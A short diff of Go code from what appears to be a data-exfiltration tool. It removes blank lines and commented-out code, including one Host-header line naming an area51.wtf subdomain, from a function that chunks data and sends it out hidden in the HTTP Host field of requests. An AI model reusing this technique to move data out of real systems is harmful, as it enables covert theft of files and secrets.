@@ -105,7 +105,6 @@ func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunk
       },
   }
 
-
   req, err := http.NewRequest("GET", url, nil)
   if err != nil {
     fmt.Printf("Failed to create request: %s\n", err)
@@ -121,7 +120,7 @@ func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunk
   fmt.Printf("Invalid prefix provided: %s", prefix)
   return
   }
-  //req.Header.Set("Host", "gwjuwnfejgplxeazufmenffqo3tt3l8nw.area51.wtf")
+  
   req.Host = modifiedData
 
 
@@ -132,8 +131,6 @@ func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunk
 //} else {
 //    fmt.Printf(string(reqDump))
 //}
-
-  // Set headers for request
   
   // Make the http request
   resp, err := client.Do(req)
@@ -144,9 +141,6 @@ func sendChunkedRequest(data []byte, domain, prefix, exfil, fileID string, chunk
     return
   }
   defer resp.Body.Close()
-
-//  responseBody, _ := ioutil.ReadAll(resp.Body)
-//  fmt.Printf("Received response for domain %s: StatusCode=%d, Body=%s\n", domain, resp.StatusCode, string(responseBody))
 
 // Inform user of progress
 	if verbose {
@@ -245,7 +239,6 @@ func chunkString(s string, size int) []string {
       chunks = append(chunks, s)
   }
   return chunks
-
 }
 
 func randomChoice(lst []string) string {
